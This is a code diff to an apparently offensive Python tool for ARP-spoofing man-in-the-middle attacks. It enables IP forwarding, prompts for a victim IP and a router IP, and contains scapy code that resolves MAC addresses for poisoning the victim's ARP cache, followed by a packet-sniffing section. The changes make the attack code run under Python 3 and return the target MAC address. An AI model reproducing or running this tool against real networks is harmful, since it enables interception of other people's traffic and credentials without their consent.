@@ -42,15 +42,15 @@ textRouterIP.grid(column=1, row=3)
 
 
 # MitM Section
-'''
+
 try:
-	textInterface = raw_input ("Enter Interface: ")
-	textVictimIP = raw_input ("Enter Victim IP: ")
-	textRouterIP = raw_input ("Enter Router IP: ")
+	textInterface = input("Enter Interface: ")
+	textVictimIP = input("Enter Victim IP: ")
+	textRouterIP = input("Enter Router IP: ")
 except KeyboardInterrupt:
 	print("\n[*] Exiting...")
 	sys.exit(1)
-'''
+
 print("\n[*] IP Fowarding enabled \n")
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
@@ -61,7 +61,7 @@ def get_mac(IP):
     ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2,
     iface = textInterface, inter = 0.1)
     for snd, rcv in ans:
-        print rcv.sprintf(r"%Ether.src%")
+        return rcv.sprintf(r"%Ether.src%")
 
 
 # restore ARP
@@ -108,6 +108,7 @@ def mitm():
         except KeyboardInterrupt:
             restoreARP()
             break
+
 
 
 # Packet Sniff
